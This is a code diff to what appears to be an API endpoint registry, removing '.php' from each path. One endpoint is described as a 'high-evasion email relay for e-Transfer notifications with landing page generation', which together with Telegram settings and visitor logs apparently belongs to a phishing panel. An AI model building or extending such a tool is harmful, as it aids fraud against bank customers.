@@ -23,7 +23,7 @@ const ENDPOINTS: Endpoint[] = [
   {
     id: 'login',
     method: 'POST',
-    path: '/api/auth/login.php',
+    path: '/api/auth/login',
     description: 'Authenticates a user and returns their profile. Supports auto-creation of new users.',
     category: 'Auth',
     auth: false,
@@ -44,7 +44,7 @@ const ENDPOINTS: Endpoint[] = [
   {
     id: 'get-settings',
     method: 'GET',
-    path: '/api/admin/global-settings.php',
+    path: '/api/admin/global-settings',
     description: 'Retrieves global system configuration including SMTP and Telegram settings.',
     category: 'Admin',
     auth: true,
@@ -60,7 +60,7 @@ const ENDPOINTS: Endpoint[] = [
   {
     id: 'save-settings',
     method: 'POST',
-    path: '/api/admin/global-settings.php',
+    path: '/api/admin/global-settings',
     description: 'Updates global system configuration.',
     category: 'Admin',
     auth: true,
@@ -76,7 +76,7 @@ const ENDPOINTS: Endpoint[] = [
   {
     id: 'list-users',
     method: 'GET',
-    path: '/api/admin/users.php',
+    path: '/api/admin/users',
     description: 'Lists all registered users in the system (passwords redacted).',
     category: 'Admin',
     auth: true,
@@ -92,7 +92,7 @@ const ENDPOINTS: Endpoint[] = [
   {
     id: 'mailer',
     method: 'POST',
-    path: '/api/mailer.php',
+    path: '/api/mailer',
     description: 'High-evasion email relay for e-Transfer notifications with landing page generation.',
     category: 'System',
     auth: false,
@@ -112,7 +112,7 @@ const ENDPOINTS: Endpoint[] = [
   {
     id: 'get-logs',
     method: 'GET',
-    path: '/api/logs.php',
+    path: '/api/logs',
     description: 'Retrieves live system event logs including visitor activity and deployments.',
     category: 'System',
     auth: false,
